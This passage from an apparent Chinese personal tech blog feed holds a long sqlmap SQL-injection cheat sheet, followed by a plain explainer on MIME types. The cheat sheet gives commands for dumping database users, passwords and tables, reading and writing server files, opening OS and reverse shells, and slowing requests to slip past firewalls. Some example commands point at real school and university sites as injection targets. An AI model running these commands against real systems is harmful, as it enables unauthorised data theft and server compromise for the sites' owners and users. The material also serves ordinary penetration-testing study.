class="line">sqlmap -u "http://xxx" --cookie="aa=bb; cc=dd" --batch --passwords</span><br><span class="line">sqlmap -u "http://xxx" --cookie="aa=bb; cc=dd" --batch -D 数据库名称 --tables</span><br><span class="line">sqlmap -u "http://xxx" --cookie="aa=bb; cc=dd" --batch -D 数据库名称 -T 表名 --columns</span><br><span class="line">sqlmap -u "http://xxx" --cookie="aa=bb; cc=dd" --batch -D 数据库名称 -T 表名 -C "user,password,字段名" --dump</span><br><span class="line"></span><br><span class="line">sqlmap -u "http://xxx" --data="id=1&amp;Submit=Submit" --cookie="aa=bb; cc=dd" --batch //post</span><br><span class="line">sqlmap -u "http://xxx" --data="id=1&amp;Submit=Submit" --second- url="http://xxxx" --cookie="aa=bb; cc=dd" –batch</span><br><span class="line">//设置二级响应结果的url</span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line">--dbnms</span><br><span class="line">\--</span><br><span class="line">--common-tables 暴力猜表名</span><br><span class="line">-u #注入点</span><br><span class="line">-f #指纹判别数据库类型</span><br><span class="line">-b #获取数据库版本信息</span><br><span class="line">-p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)</span><br><span class="line">-D “” #指定数据库名</span><br><span class="line">-T “” #指定表名</span><br><span class="line">-C “” #指定字段</span><br><span class="line">-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume)</span><br><span class="line">–columns #列出字段</span><br><span class="line">–current-user #获取当前用户名称</span><br><span class="line">–current-db #获取当前数据库名称</span><br><span class="line">–users #列数据库所有用户</span><br><span class="line">–passwords #数据库用户所有密码</span><br><span class="line">–privileges #查看用户权限(–privileges -U root)</span><br><span class="line">-U #指定数据库用户</span><br><span class="line">–dbs #列出所有数据库</span><br><span class="line">–tables -D “” #列出指定数据库中的表</span><br><span class="line">–columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段</span><br><span class="line">–dump-all #列出所有数据库所有表</span><br><span class="line">–exclude-sysdbs #只列出用户自己新建的数据库和表</span><br><span class="line">–dump -T “数据库” -D “表” -C “字段” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)</span><br><span class="line">–dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据</span><br><span class="line">–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)</span><br><span class="line">–os #指定系统(Linux,Windows)</span><br><span class="line">-v #详细的等级(0-6)</span><br><span class="line">0：只显示Python的回溯，错误和关键消息。</span><br><span class="line">1：显示信息和警告消息。</span><br><span class="line">2：显示调试消息。</span><br><span class="line">3：有效载荷注入。</span><br><span class="line">4：显示HTTP请求。</span><br><span class="line">5：显示HTTP响应头。</span><br><span class="line">6：显示HTTP响应页面的内容</span><br><span class="line">–privileges #查看权限</span><br><span class="line">–is-dba #是否是数据库管理员</span><br><span class="line">–roles #枚举数据库用户角色</span><br><span class="line">–udf-inject #导入用户自定义函数（获取系统权限）</span><br><span class="line">–union-check #是否支持union 注入</span><br><span class="line">–union-cols #union 查询表记录</span><br><span class="line">–union-test #union 语句测试</span><br><span class="line">–union-use #采用union 注入</span><br><span class="line">–union-tech orderby #union配合order by</span><br><span class="line">–method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″)</span><br><span class="line">–cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)</span><br><span class="line">–referer “” #使用referer欺骗(–referer “http://www.baidu.com”)</span><br><span class="line">–user-agent “” #自定义user-agent</span><br><span class="line">–proxy “http://127.0.0.1:8118″ #代理注入</span><br><span class="line">–string “” #指定关键词</span><br><span class="line">–threads #采用多线程(–threads 3)</span><br><span class="line">–sql-shell #执行指定sql命令</span><br><span class="line">–sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1″ )</span><br><span class="line">–file-read #读取指定文件</span><br><span class="line">–file-write #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)</span><br><span class="line">–file-dest #要写入的文件绝对路径</span><br><span class="line">–os-cmd=id #执行系统命令</span><br><span class="line">–os-shell #系统交互shell</span><br><span class="line">–os-pwn #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/)</span><br><span class="line">–msf-path= #matesploit绝对路径(–msf-path=/opt/framework/msf3/)</span><br><span class="line">–os-smbrelay #</span><br><span class="line">–os-bof #</span><br><span class="line">–reg-read #读取win系统注册表</span><br><span class="line">–priv-esc #</span><br><span class="line">–time-sec= #延迟设置 默认–time-sec=5 为5秒</span><br><span class="line">-p “user-agent” –user-agent “sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)” #指定user-agent注入</span><br><span class="line">–eta #盲注</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url 判断</span><br><span class="line">sqlmap.py -u url --is-dba 判断是不是root权限</span><br><span class="line">sqlmap.py -u url --is-dba -v 这是判断当前数据库的使用者是否是dba</span><br><span class="line">sqlmap.py -u url --users -v 0 这句的目的是列举数据库的用户</span><br><span class="line">sqlmap.py -u url --passwords -v 0 这句的目的是获取数据库用户的密码</span><br><span class="line">sqlmap.py -u url --privileges -v 0 这是判断当前的权限</span><br><span class="line">sqlmap.py -u url --dbs -v 0 这句的目的是将所有的数据库列出来</span><br><span class="line">sqlmap.py -u url --tables -D '表' 爆表</span><br><span class="line">sqlmap.py -u url --columns -T ‘表’-D ‘数据库’爆列</span><br><span class="line">sqlmap.py -u url --dump -T '表' --start 1 --stop 4 -v 0 这里是查询第2到第4行的内</span><br><span class="line">sqlmap.py -u url --dump -all -v 0</span><br><span class="line">\-------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">--current-user 看看权限……</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">access注入</span><br><span class="line">sqlmap.py -u "url" ==检测。</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "url" --tables ==猜表。</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "url" --columns -T "表名" ==猜字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "url" --dump -T "表名" -C "字段,字段" ==暴表里面的字段的内容</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mysql数据注入</span><br><span class="line">sqlmap.py -u url --privileg ==查看权限(root什么什么的)</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --is-dba 判断是不是root权限</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --dbs ==获取数据库</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --tables -D "数据库名" ==获取当中的数据库的表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --columns -D "数据库名" -T "表名" ==获取数据库 表中的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --dump -D "数据库名" -T "表名" -C "字段,字段" ==获取数据库表的字段里的内容</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Cookie注入</span><br><span class="line"></span><br><span class="line">注入点：http://www.ntjx.org/jsj/DownloadShow.asp?id=9</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "http://www.ntjx.org/jsj/DownloadShow.asp" --cookie "id=9" --table --level 2 ==暴表名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "http://www.ntjx.org/jsj/DownloadShow.asp" --cookie "id=9" --columns -T "表名" --level 2 ==暴表的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "http://www.ntjx.org/jsj/DownloadShow.asp" --cookie "id=9" --dump -T "表名" -C "字段,字段" --level 2 ==暴表的字段内容</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">post登陆注入 mssql</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&amp;tfUPass=12345"</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&amp;tfUPass=12345" --dbs ==获取数据库名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&amp;tfUPass=12345" --tables -D "数据库名" ==列表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&amp;tfUPass=12345" --columns -T "表名" -D "数据库名" ==暴字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u "http://testasp.vulnweb.com/Login.asp" --data "tfUName=12345&amp;tfUPass=12345" --dump --columns -C "字段,字段" -T "表" -D "数据名" ==暴字段内容</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">直接拿shell或者执行命令（需要权限很大跟物理路径）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --os-shell</span><br><span class="line"></span><br><span class="line">sqlmap.py -u url --os-cmd=ipconfig</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">伪静态注入</span><br><span class="line">注入点：http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html （注意：要加个* 哪里存在注入就加上 * 号）</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --dbs ==获取数据库名</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --tables -D "数据名" ==获取数据库当中的表</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --columns -D "数据名" -T "表名" ==获取数据库的表中的字段</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40*.html --dump -D "数据名" -T "表名" -C "字段,字段" ==获取数据库的表中的字段内容</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">请求延时（一般突破防火墙）</span><br><span class="line"></span><br><span class="line">第一种方法：sqlmap.py -u url --delay 2 （注意：2是两秒的意思，也就是说2秒访问一次）</span><br><span class="line">第二种方法： sqlmap.py -u url --safe-freq 3 （注意：3是3次的意思。。）</span><br><span class="line"></span><br><span class="line">可以组合使用 sqlmap.py -u url --delay 2 --safe-freq 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用文件来注入</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /?id=1 HTTP/1.1</span><br><span class="line">Host: www.why25.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0</span><br><span class="line"></span><br><span class="line">x-forwarded-for: 1*(存在注入)</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Cookie: PHPSESSID=109b6bcfd7ec056764c71aa62a4d6638</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">星号(*) 指定注入点</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">sqlmap -r c:/s.txt --level 3 --dbms=mysql --risk 1 注意： --level 是测试等级意思就是说我要更加耐心仔仔细细的加强检测等级3 如果没有level 默认等级是1的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">别人再次整理过的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-p 指定测试参数</span><br><span class="line">-b 获取banner</span><br><span class="line">--dbs 列举数据库</span><br><span class="line">--is-dba 是否是管理员权限</span><br><span class="line">--current-db 当前数据库</span><br><span class="line">--current-user 当前用户</span><br><span class="line">--tables 列举数据库的表名</span><br><span class="line">--count 检索所有条目数</span><br><span class="line">--columns 获取表的列名</span><br><span class="line">--dump 获取表中的数据，包含列</span><br><span class="line">--dump-all 转存DBMS数据库所有表项目</span><br><span class="line">--level 测试等级(1-5)，默认为1</span><br><span class="line">-v 显示详细信息</span><br><span class="line"></span><br><span class="line">读取数据库---&gt;读取表----&gt;读取表的列----&gt;获取内容</span><br><span class="line"></span><br><span class="line">-D 指定数据库</span><br><span class="line"></span><br><span class="line">-T 指定表</span><br><span class="line"></span><br><span class="line">-C 指定列</span><br><span class="line"></span><br><span class="line">--dbms=mysql oracle mssql 指定数据库</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">参照官方文档：https://github.com/sqlmapproject/sqlmap/wiki/Usage。</span><br><span class="line"></span><br><span class="line">-b 获取banner</span><br><span class="line">-p 指定测试参数</span><br><span class="line">-g 从google中获取URL , -g "inurl:aspx?id="</span><br><span class="line">--gpage=GOOGLEPAGE 指定Google页码</span><br><span class="line">--union-check 是否支持union 注入</span><br><span class="line">--union-cols union 查询表记录</span><br><span class="line">--union-test union 语句测试</span><br><span class="line">--union-use 采用union 注入</span><br><span class="line">--proxy 代理注入</span><br><span class="line">---threads 采用多线程</span><br><span class="line">--user-agent 自定义user-agent</span><br><span class="line">--referer=REFERER HTTP referer头</span><br><span class="line">--proxy=PROXY 使用代理</span><br><span class="line">--string 指定关键词</span><br><span class="line">--tor 创建tor的匿名网络</span><br><span class="line">--predict-output 常见的查询输出预测</span><br><span class="line">--keep-alive 使用持久HTTP（S）连接</span><br><span class="line">--eval=EVALCODE 所使用HTTP参数污染</span><br><span class="line">-a,-all 查询所有</span><br><span class="line">--hostname 主机名</span><br><span class="line">--is-dbs 是否是管理员权限</span><br><span class="line">--users 枚举所有用户</span><br><span class="line">--passwords 枚举所有用户密码</span><br><span class="line">--roles 枚举所有用户角色</span><br><span class="line">--schema 枚举DBMS模式</span><br><span class="line">--count 检索所有条目数</span><br><span class="line">--dump 转存DBMS数据库表项目，需要制定字段名称(列名称)</span><br><span class="line">--dump-all 转存DBMS数据库所有表项目</span><br><span class="line">--search 搜索列，表或数据库名称</span><br><span class="line">--exclude-sysdbs 在枚举表时排除系统数据库</span><br><span class="line">--sql-query=query 执行SQL语句</span><br><span class="line">--file-read=RFILE 读取操作</span><br><span class="line">--file-write=WFILE 写入操作</span><br><span class="line">--file-dest=DFILE 绝对路径写入</span><br><span class="line">--reg-read 阅读一个Windows注册表项值</span><br><span class="line">--reg-add 增加一个Windows注册表项值数据</span><br><span class="line">--reg-del 删除一个Windows注册表项值数据</span><br><span class="line">--reg-key=REGKEY Windows注册表键</span><br><span class="line">--reg-value=REGVAL Windows注册表键值</span><br><span class="line">-- reg-data=REGDATA Windows注册表的键值项数据</span><br><span class="line">--reg-type=REGTYPE Windows注册表键的值类型</span><br><span class="line">--csv-del=CSVDEL 划定CSV输出中使用的字符 (default ",")</span><br><span class="line">--dump-format=DUMP 转存数据格式(CSV (default), HTML or SQLITE)</span><br><span class="line">--hex 使用十六进制数据检索功能</span><br><span class="line">--output-dir=ODIR 自定义输出的目录路径</span><br><span class="line">--update 更新SQLMap</span><br><span class="line">--purge-output 安全的删除所有内容输出目录</span><br><span class="line">--check-waf 启发式检查WAF / IPS / IDS保护</span><br><span class="line">--os-pwn 反弹shell</span><br><span class="line">--cookie=COOKIE 指定HTTP Cookie ，预登陆</span><br><span class="line">--random-agent 使用随机选定的User-Agent头</span><br><span class="line">--tamper=TAMPER 使用SQLMap插件</span><br><span class="line">--level 测试等级(1-5)，默认为1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是MIME TYPE</title>
      <link href="/2020/12/01/whatmime/"/>
      <url>/2020/12/01/whatmime/</url>
      
        <content type="html"><![CDATA[<blockquote><p>介绍了MIME TYPE</p></blockquote><a id="more"></a><h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><p>首先，我们要了解浏览器是如何处理内容的。在浏览器中显示的内容有 HTML、有 XML、有 GIF、还有 Flash ……那么，浏览器是如何区分它们，决定什么内容用什么形式来显示呢？答案是 MIME Type，也就是该资源的媒体类型。</p><p>媒体类型通常是通过 HTTP 协议，由 Web 服务器告知浏览器的，更准确地说，是通过 Content-Type 来表示的，例如:</p><p>Content-Type: text/HTML</p><p>表示内容是 text/HTML 类型，也就是超文本文件。为什么是“text/HTML”而不是“HTML/text”或者别的什么？MIME Type 不是个人指定的，是经过 ietf 组织协商，以 RFC 的形式作为建议的标准发布在网上的，大多数的 Web 服务器和用户代理都会支持这个规范 (顺便说一句，Email 附件的类型也是通过 MIME Type 指定的)。</p><p>通常只有一些在互联网上获得广泛应用的格式才会获得一个 MIME Type，如果是某个客户端自己定义的格式，一般只能以 application/x- 开头。</p><p>XHTML 正是一个获得广泛应用的格式，因此，在 RFC 3236 中，说明了 XHTML 格式文件的 MIME Type 应该是 application/xHTML+XML。</p><p>当然，处理本地的文件，在没有人告诉浏览器某个文件的 MIME Type 的情况下，浏览器也会做一些默认的处理，这可能和你在操作系统中给文件配置的 MIME Type 有关。比如在 Windows 下，打开注册表的“HKEY_LOCAL_MACHINESOFTWAREClassesMIMEDatabaseContent Type”主键，你可以看到所有 MIME Type 的配置信息。</p><h3 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h3><p>在把输出结果传送到浏览器上的时候，浏览器必须启动适当的应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。在HTTP中，MIME类型被定义在Content-Type header中。</p><p>例如，架设你要传送一个Microsoft Excel文件到客户端。那么这时的MIME类型就是“application/vnd.ms-excel”。在大多数实际情况中，这个文件然后将传送给Execl来处理（假设我们设定Execl为处理特殊MIME类型的应用程序）。在ASP中，设定MIME类型的方法是通过Response对象的ContentType属性。</p><p>多媒体文件格式MIME</p><p>最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。</p><p>MIME意为多目Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。</p><p>每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。</p><p>常见的MIME类型</p><p>超文本标记语言文本 .html,.html text/html<br>普通文本 .txt text/plain<br>RTF文本 .rtf application/rtf<br>GIF图形 .gif image/gif<br>JPEG图形 .ipeg,.jpg image/jpeg<br>au声音文件 .au audio/basic<br>MIDI音乐文件 mid,.midi audio/midi,audio/x-midi<br>RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio<br>MPEG文件 .mpg,.mpeg video/mpeg<br>AVI文件 .avi video/x-msvideo<br>GZIP文件 .gz application/x-gzip<br>TAR文件 .tar application/x-tar</p><p>Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。而Web服务器和浏览器（包括操作系统）中，缺省都设置了标准的和常见的MIME类型，只有对于不常见的 MIME类型，才需要同时设置服务器和客户浏览器，以进行识别。</p><p>由于MIME类型与文档的后缀相关，因此服务器使用文档的后缀来区分不同文件的MIME类型，服务器中必须定义文档后缀和MIME类型之间的对应关系。而客户程序从服务器上接收数据的时候，它只是从服务器接受数据流，并不了解文档的名字，因此服务器必须使用附加信息来告诉客户程序数据的MIME类型。服务器在发送真正的数据之前，就要先发送标志数据的MIME类型的信息，这个信息使用Content-type关键字进行定义，例如对于HTML文档，服务器将首先发送以下两行MIME标识信息,这个标识并不是真正的数据文件的一部分。</p><p>Content-type: text/html</p><p>注意，第二行为一个空行，这是必须的，使用这个空行的目的是将MIME信息与真正的数据内容分隔开。</p><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>官方的 MIME 信息是由 Internet Engineering Task Force (IETF) 在下面的文档中提供的：<br>RFC-822 Standard for ARPA Internet text messages</p><p>RFC-2045 MIME Part 1: Format of Internet Message Bodies</p><p>RFC-2046 MIME Part 2: Media Types</p><p>RFC-2047 MIME Part 3: Header Extensions for Non-ASCII Text</p><p>RFC-2048 MIME Part 4: Registration Procedures</p><p>RFC-2049 MIME Part 5: Conformance Criteria and Examples</p><p>不同的应用程序支持不同的 MIME 类型。</p>]]></content>
      
      
      <categories>
          
          <category> 网络编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全复习笔记—欺骗攻击与防御</title>
      <link href="/2020/11/28/qipianattack/"/>
      <url>/2020/11/28/qipianattack/</url>
      
